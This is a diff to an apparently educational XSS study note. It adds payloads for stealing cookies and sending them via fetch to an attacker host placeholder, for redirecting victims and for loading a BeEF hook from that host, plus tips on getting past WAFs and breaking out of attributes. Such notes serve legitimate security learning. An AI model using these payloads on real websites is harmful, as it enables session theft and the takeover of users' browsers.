@@ -18,6 +18,9 @@ tags:
 > | Cookie steal | `<script>document.location='http://<LHOST>/?c='+document.cookie</script>` |
 > | Attribute inject | `" onmouseover="alert(1)` |
 > | Filter bypass | `<ScRiPt>alert(1)</ScRiPt>` |
+> | Cookie steal (fetch) | `<script>fetch('http://<LHOST>/?c='+document.cookie)</script>` |
+> | Redirect victim | `<script>window.location='http://<LHOST>'</script>` |
+> | BeEF hook | `<script src="http://<LHOST>:3000/hook.js"></script>` |
 
 ## Decision Tree
 
@@ -63,6 +66,8 @@ flowchart TD
 > - Your characters appear as `&lt;` / `&gt;` instead of `<` / `>` → the app HTML-encoded them, so they render as text and won't execute. Try another input or context. See [[🔣 Encoding Reference]].
 > - You inject `<script>` between tags but it never fires → check where the input actually lands; inside an existing attribute or JS block you need quotes/semicolons to break out first, not full tags.
 > - You test only in the browser view → always check the raw page source (Ctrl+U) or the Burp response; encoding is easy to miss on the rendered page.
+> - Request comes back `403 Forbidden` / `406 Not Acceptable` instead of reflecting your input → a WAF is blocking the payload outright, not just encoding it. Try case variation (`<ScRiPt>`), a different tag (`<svg`, `<img`), or URL/double-encoding to slip past the filter.
+> - Special characters reflect unfiltered but nothing ever executes → check the response `Content-Type`; `application/json` or `text/plain` responses are never parsed as HTML/JS by the browser no matter how "raw" your input looks.
 > Full list: [[⚠️ Common Errors & Troubleshooting]]
 
 > [!tip] Beginner note
@@ -97,6 +102,13 @@ We may need to use different sets of characters, depending on where our input is
 ```sh
 < > ' " { } ;
 ```
+
+> [!example] Breaking out of an attribute and a tag at once
+> When you don't know exactly which context your input lands in, a combined payload confirms both possibilities in one shot:
+> ```html
+> "><script>alert(1)</script>
+> ```
+> The leading `">` closes a quoted attribute and its surrounding tag; the `<script>` that follows then executes as if it were sitting between two ordinary HTML elements.
 
 ---
 %% graph-links %%
